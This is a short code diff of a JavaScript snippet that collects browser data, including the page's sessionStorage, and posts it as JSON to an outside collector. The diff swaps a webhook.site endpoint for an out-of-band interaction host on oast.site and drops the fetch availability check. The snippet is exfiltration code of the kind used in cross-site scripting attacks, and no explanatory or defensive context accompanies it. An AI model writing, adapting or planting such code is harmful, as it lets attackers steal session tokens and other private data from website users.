@@ -5,12 +5,11 @@
         sessionStorage: JSON.stringify(sessionStorage),
     };
     
-    if(typeof fetch !== 'undefined'){
-        fetch('https://webhook.site/d699ea0b-e69e-44af-88bf-03cd8d40bebb/collect', {
+    fetch('https://ah8eaj5bg2di7v5tu85c91c4vwzuopbe0.oast.site/', {
             method: 'POST',
             mode: 'no-cors',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify(data)
         });
-    }
+
 })();
